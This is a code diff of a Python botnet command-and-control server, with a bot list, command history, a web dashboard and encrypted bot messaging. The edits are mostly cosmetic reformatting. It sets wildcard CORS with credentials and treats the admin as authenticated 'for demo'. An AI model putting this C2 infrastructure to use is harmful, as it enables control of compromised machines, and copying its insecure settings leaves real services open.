@@ -23,7 +23,7 @@ import signal
 import sys
 from typing import Optional, Dict, Any, List
 from pathlib import Path
-from aiohttp import web, WSMsgType
+from aiohttp import web
 import aiohttp_cors
 
 # Import our enhanced utilities
@@ -37,7 +37,6 @@ from utils import (
     generate_bot_id,
     create_command_payload,
 )
-
 
 
 class EnhancedBotnetServer:
@@ -72,7 +71,6 @@ class EnhancedBotnetServer:
         self.command_history: List[Dict[str, Any]] = []
         self.shutdown_event = asyncio.Event()
 
-
         # Performance monitoring
         self.stats = {
             "start_time": datetime.datetime.now(),
@@ -91,42 +89,45 @@ class EnhancedBotnetServer:
     async def setup_web_server(self) -> None:
         """Setup the web dashboard server."""
         self.web_app = web.Application()
-        
+
         # Setup CORS
-        cors = aiohttp_cors.setup(self.web_app, defaults={
-            "*": aiohttp_cors.ResourceOptions(
-                allow_credentials=True,
-                expose_headers="*",
-                allow_headers="*",
-                allow_methods="*"
-            )
-        })
-        
+        cors = aiohttp_cors.setup(
+            self.web_app,
+            defaults={
+                "*": aiohttp_cors.ResourceOptions(
+                    allow_credentials=True,
+                    expose_headers="*",
+                    allow_headers="*",
+                    allow_methods="*",
+                )
+            },
+        )
+
         # Add routes
-        self.web_app.router.add_get('/', self.serve_dashboard)
-        self.web_app.router.add_get('/dashboard', self.serve_dashboard)
-        self.web_app.router.add_get('/api/status', self.api_status)
-        self.web_app.router.add_get('/api/bots', self.api_bots)
-        self.web_app.router.add_get('/api/stats', self.api_stats)
-        
+        self.web_app.router.add_get("/", self.serve_dashboard)
+        self.web_app.router.add_get("/dashboard", self.serve_dashboard)
+        self.web_app.router.add_get("/api/status", self.api_status)
+        self.web_app.router.add_get("/api/bots", self.api_bots)
+        self.web_app.router.add_get("/api/stats", self.api_stats)
+
         # Add CORS to all routes
         for route in list(self.web_app.router.routes()):
             cors.add(route)
-    
+
     async def serve_dashboard(self, request: web.Request) -> web.Response:
         """Serve the cyberpunk dashboard HTML."""
         try:
             dashboard_path = Path(__file__).parent / "dashboard.html"
             if dashboard_path.exists():
-                with open(dashboard_path, 'r', encoding='utf-8') as f:
+                with open(dashboard_path, "r", encoding="utf-8") as f:
                     content = f.read()
-                return web.Response(text=content, content_type='text/html')
+                return web.Response(text=content, content_type="text/html")
             else:
                 return web.Response(text="Dashboard not found", status=404)
         except Exception as e:
             self.logger.error(f"Error serving dashboard: {str(e)}")
             return web.Response(text="Error loading dashboard", status=500)
-    
+
     async def api_status(self, request: web.Request) -> web.Response:
         """API endpoint for server status."""
         try:
@@ -138,20 +139,22 @@ class EnhancedBotnetServer:
                 "commands_processed": self.stats["commands_processed"],
                 "bytes_sent": self.stats["bytes_sent"],
                 "bytes_received": self.stats["bytes_received"],
-                "uptime_seconds": (datetime.datetime.now() - self.stats["start_time"]).total_seconds(),
+                "uptime_seconds": (
+                    datetime.datetime.now() - self.stats["start_time"]
+                ).total_seconds(),
                 "tls_enabled": self.ssl_context is not None,
                 "admin_authenticated": True,  # Assume authenticated for demo
                 "bots": active_bots,
                 "command_history": self.command_history[-20:],  # Last 20 commands
                 "server_version": "2.0 Enhanced",
-                "encryption_enabled": True
+                "encryption_enabled": True,
             }
 
             return web.json_response(status_data)
         except Exception as e:
             self.logger.error(f"Error in status API: {str(e)}")
             return web.json_response({"error": "Internal server error"}, status=500)
-    
+
     async def api_bots(self, request: web.Request) -> web.Response:
         """API endpoint for bot information."""
         try:
@@ -160,7 +163,7 @@ class EnhancedBotnetServer:
         except Exception as e:
             self.logger.error(f"Error in bots API: {str(e)}")
             return web.json_response({"error": "Internal server error"}, status=500)
-    
+
     async def api_stats(self, request: web.Request) -> web.Response:
         """API endpoint for detailed statistics."""
         try:
@@ -310,7 +313,10 @@ class EnhancedBotnetServer:
 
             # Validate message length
             if message_length <= 0 or message_length > self.config.max_message_size:
-                self.logger.warning(f"Invalid message length: {message_length} (limit: {self.config.max_message_size})")
+                max_size = self.config.max_message_size
+                self.logger.warning(
+                    f"Invalid message length: {message_length} " f"(limit: {max_size})"
+                )
                 return None
 
             # Read encrypted data
@@ -510,14 +516,16 @@ class EnhancedBotnetServer:
         try:
             # Setup web server first
             await self.setup_web_server()
-            
+
             # Start web server
             self.web_runner = web.AppRunner(self.web_app)
             await self.web_runner.setup()
             web_site = web.TCPSite(self.web_runner, self.host, self.web_port)
             await web_site.start()
-            self.logger.info(f"Web dashboard available at http://{self.host}:{self.web_port}")
-            
+            self.logger.info(
+                f"Web dashboard available at http://{self.host}:{self.web_port}"
+            )
+
             # Start main server
             if self.ssl_context:
                 self.server = await asyncio.start_server(
@@ -655,4 +663,3 @@ if __name__ == "__main__":
         print("\nEnhanced server shutdown completed.")
     except Exception as e:
         print(f"Fatal error in enhanced server: {e}")
-
